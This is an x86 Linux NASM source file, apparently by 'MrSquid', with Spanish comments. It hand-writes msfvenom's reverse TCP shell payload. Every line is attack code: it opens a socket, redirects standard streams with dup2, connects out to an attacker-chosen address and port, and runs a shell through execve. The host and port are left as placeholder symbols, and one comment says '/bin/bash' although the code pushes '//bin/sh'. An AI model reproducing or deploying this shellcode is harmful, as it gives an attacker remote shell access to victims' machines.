; Reverse_Shell.nasm
; NASM code obtain from: msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=8888 EXITFUNC=THREAD -f raw | ndisasm -u -
; Author: MrSquid



global _start ;Para definir donde arranca 

section .text

_start: 
	xor ebx,ebx ;Socket
	mul ebx
	push ebx
	inc ebx
	push ebx
	push byte +0x2
	mov ecx,esp
	mov al,0x66
	int 0x80

	xchg eax,ebx
	pop ecx
	dup2:	
		mov al,0x3f
		int 0x80
		dec ecx
		jns dup2
	;CONNECT
	push dword LOCALHOST ;0x101a8c0 ;LHOST 
	push dword LOCALPORT ;0xb8220002 ;LPORT
	mov ecx,esp
	mov al,0x66
	push eax
	push ecx
	push ebx
	mov bl,0x3
	mov ecx,esp
	int 0x80
	;EXECVE
	push edx
	push dword 0x68732f6e ;EXECVE("/bin/bash")
	push dword 0x69622f2f
	mov ebx,esp
	push edx
	push ebx
	mov ecx,esp
	mov al,0xb
	int 0x80


